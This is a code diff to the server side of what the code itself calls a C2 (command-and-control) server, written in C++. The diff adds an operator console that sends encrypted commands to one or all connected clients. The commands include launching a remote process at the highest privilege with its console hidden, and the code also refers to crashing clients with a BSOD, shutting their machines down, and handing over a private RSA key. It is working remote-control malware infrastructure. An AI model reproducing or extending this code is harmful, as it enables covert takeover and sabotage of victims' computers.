@@ -120,7 +120,7 @@ void ServerInterface::ListenForUDPMessages() {
  * \param req - a 'ServerCommand' struct to tell the clients which action to perform
  * \return TRUE or FALSE depending on if the last message sent failed.
  */
-BOOL ServerInterface::TCPSendMessageToAllClients(ServerCommand& req) {
+BOOL ServerInterface::TCPSendMessageToAllClients(Packet& req) {
 	BOOL success = FALSE;
 
 	m_ClientListMutex.lock();
@@ -321,7 +321,7 @@ BOOL ServerInterface::PerformRequest(ClientRequest req, Server on, long cuid, so
 		//	break;
 		//}
 
-		ServerCommand reply = {};
+		Packet reply = {};
 		reply.action = RemoteAction::kReturnPrivateRSAKey;
 		// TODO: dont insert private encryption key cause the buffer cant hold it (max 256 when trying to insert 4096+- key)
 		// find another way to send the private encryption key. could just be normal
@@ -446,19 +446,22 @@ void ServerInterface::OnTCPConnection(SOCKET connection, sockaddr_in incoming) {
 	receive.detach();
 }
 
-BOOL ServerInterface::HandleUserInput(unsigned int command, ServerCommand& outputCommand) {
+BOOL ServerInterface::HandleUserInput(unsigned int command, Packet& outputCommand) {
 	BOOL performed = FALSE;
-	ServerCommand cmdInfo = {};
+	Packet cmdInfo = {};
 	cmdInfo.action = static_cast<RemoteAction>(command);
 
 	switch ( command ) {
 	case RemoteAction::kOpenRemoteProcess: {
 		std::string input;
-		std::cout << "opening process\n";
-		std::cin >> input;
-		std::cout << "your input: " << input << std::endl;
-		cmdInfo.flags = RUN_AS_HIGHEST | USE_CLI | PACKET_IS_A_COMMAND;
+		
+		std::cout << "Arguments for " << kOpenRemoteProcess << ": ";
+		std::getline(std::cin, input);
+		
+		cmdInfo.flags = RUN_AS_HIGHEST | USE_CLI | PACKET_IS_A_COMMAND | NO_CONSOLE;
+		std::cout << "flags...\n";
 		cmdInfo.insert(input);
+		std::cout << "Inserted...\n";
 		performed = TRUE;
 		break;		
 	}
@@ -483,11 +486,13 @@ BOOL ServerInterface::SendCommandsToClients() {
 
 void ServerInterface::OutputServerCommands() {
 	std::cout << "Showing possible server commands:\n";
-	std::cout << "\t" << kOpenRemoteProcess << ": Open a remote process.\n";
-	std::cout << "\t" << kPingClient << ": Send a ping to a remote host.\n";
-	std::cout << "\t" << kRemoteBSOD << ": Cause a BSOD on the client.\n";
-	std::cout << "\t" << kRemoteShutdown << ": Shutdown the clients machine.\n";
-	std::cout << "\t" << kKillClient << ": Forcefully disconnect the client from the C2 server.\n";
+	for ( auto& [val, info] : this->m_Commands ) {
+		std::cout << "\t[" << val << "] - " << info << std::endl;
+	}
+}
+
+BOOL ServerInterface::IsServerCommand(long command) {
+	return this->m_Commands.contains(static_cast<RemoteAction>(command));
 }
 
 void ServerInterface::RunUserInputOnClients() {
@@ -497,43 +502,97 @@ void ServerInterface::RunUserInputOnClients() {
 	std::cout << "Running commands on remote hosts.\n";
 	while ( this->m_TCPServerDetails.alive && m_ClientList.size() > 0 ) {
 		// select which client to run command on
-		std::string clientID;	
-		//unsigned int  command   = 0;
-		BOOL		  performed = FALSE;
-		ServerCommand performingCommand;
+		std::string  clientID;	
+		long		 lClientID     = 0;
+		Client*		 client        = nullptr;
+		BOOL		 performed     = FALSE;
+		BOOL		 globalCommand = FALSE; // perform command on all clients
+		std::string  command;
+		RemoteAction lCommand = kNone;
+		BOOL		 sent	  = FALSE;
 
 		std::cout << "[Client ID to perform command on; 0 for all]: ";
 		std::getline(std::cin, clientID);
-
-
-		std::string command;
-		std::getline(std::cin, command);
-		std::cout << "Your input: " << command << std::endl;
-		//performed = HandleUserInput(command, performingCommand);
-		//std::cout << "Fill out performingCommand\n";
-
-		Client* client = GetClientPtr(std::stol(clientID));
-		if ( !client ) {
+		
+		try {
+			if ( (lClientID = std::stol(clientID)) == 0 )
+				globalCommand = TRUE;
+		} catch ( std::invalid_argument& err ) {
+			std::cout << "Input Error; Invalid input." << std::endl;
+			system("pause");
+			system("cls");
+			continue;
+		} catch ( std::out_of_range& err ) {
+			std::cout << "Input Error; Number too large" << std::endl;
+			system("pause");
 			system("cls");
 			continue;
 		}
+
+		if ( !globalCommand ) {
+			client = GetClientPtr(std::stol(clientID));
+			if ( !client ) {
+				system("cls");
+				continue;
+			}
+		}
 		
-		//std::cout << "cli size " << performingCommand.commandLineArguments.size() << std::endl;
-		BYTESTRING serialized = Serialization::SerializeString(command);
-		//std::cout << "serialized size:" << serialized.size() << std::endl;
-		BYTESTRING encrypted = LGCrypto::RSAEncrypt(serialized, client->ClientPublicKey, FALSE);
-		std::cout << "encrypted\n";
+		this->OutputServerCommands();
 
-		BOOL success = NetCommon::TransmitData(encrypted, client->GetSocket(), TCP);
-		if ( success ) {
-			std::cout << "Sent the message to client.\n";
+		std::cout << "[Enter integer value corresponding to the command to perform]: ";
+		std::getline(std::cin, command);
+
+		try {
+			lCommand = static_cast<RemoteAction>(std::stol(command));
+		} catch ( std::invalid_argument& err ) {
+			std::cout << "Input Error; Invalid input." << std::endl;
+			system("pause");
+			system("cls");
+			continue;
+		} catch ( std::out_of_range& err ) {
+			std::cout << "Input Error; Number too large" << std::endl;
+			system("pause");
+			system("cls");
+			continue;
+		}
+
+		if ( !IsServerCommand(lCommand) ) {
+			std::cout << "Invalid command; " << lCommand << " Not a command" << std::endl;
+			system("pause");
+			system("cls");
+			continue;
+		}
+
+		Packet toSend;
+		BOOL userInput = HandleUserInput(lCommand, toSend); // fill packet with info
+		if ( !userInput ) {
+			std::cout << "Error taking user input." << std::endl;
+			system("pause");
+			system("cls");
+			continue;
+		}
+
+		BYTESTRING serialized = Serialization::SerializeStruct(toSend);
+
+		if ( !globalCommand ) {
+			BYTESTRING encrypted = LGCrypto::RSAEncrypt(serialized, client->ClientPublicKey, FALSE);
+			sent = NetCommon::TransmitData(encrypted, client->GetSocket(), TCP);
+		} else {
+			this->m_ClientListMutex.lock();
+			for ( auto& [ cuid, host ] : this->m_ClientList ) {
+				BYTESTRING encrypted = LGCrypto::RSAEncrypt(serialized, host.ClientPublicKey, FALSE);
+				sent = NetCommon::TransmitData(encrypted, host.GetSocket(), TCP);
+			}
+			this->m_ClientListMutex.unlock();
+		}
+
+		if ( sent ) {
+			std::cout << "Successfully sent your command." << std::endl;
+			system("pause");
+		} else {
+			std::cout << "Error sending your command." << std::endl;
 			system("pause");
 		}
-		else {
-			//std::cout << "There was an error performing the request. Request: " << performingCommand.action << " Client: " << clientID << std::endl;
-			system("pause");
-		}
-
 		system("cls");
 	}
 }
@@ -654,7 +713,7 @@ BOOL ServerInterface::StartServer(Server& server) {
 		std::thread acceptThread(&ServerInterface::AcceptTCPConnections, this);
 		acceptThread.detach(); // run accept thread even after this function returns
 
-		//this->SendCommandsToClients();
+		this->SendCommandsToClients();
 	}
 	// otherwise if not tcp server then listen for udp messaages
 	else if ( server.type == SOCK_DGRAM ) {
@@ -676,7 +735,7 @@ BOOL ServerInterface::StartServer(Server& server) {
  * \param req - the 'ServerCommand' structure to send over the socket
  * \return TRUE or FALSE depending if the message was sent or not
  */
-BOOL ServerInterface::TCPSendMessageToClient(long cuid, ServerCommand& req) {
+BOOL ServerInterface::TCPSendMessageToClient(long cuid, Packet& req) {
 	Client* c = GetClientPtr(cuid);
 	return NetCommon::TransmitData(req, c->GetSocket(), TCP);
 }
@@ -773,7 +832,7 @@ ClientResponse ServerInterface::PingClient(long cuid) {
 		return {};
 
 	// send the ping to the client over tcp
-	ServerCommand pingCommand;
+	Packet pingCommand;
 	pingCommand.action = RemoteAction::kPingClient;
 	pingCommand.flags = RESPOND_WITH_STATUS | PACKET_IS_A_COMMAND;
 	pingCommand.buffLen = 0;
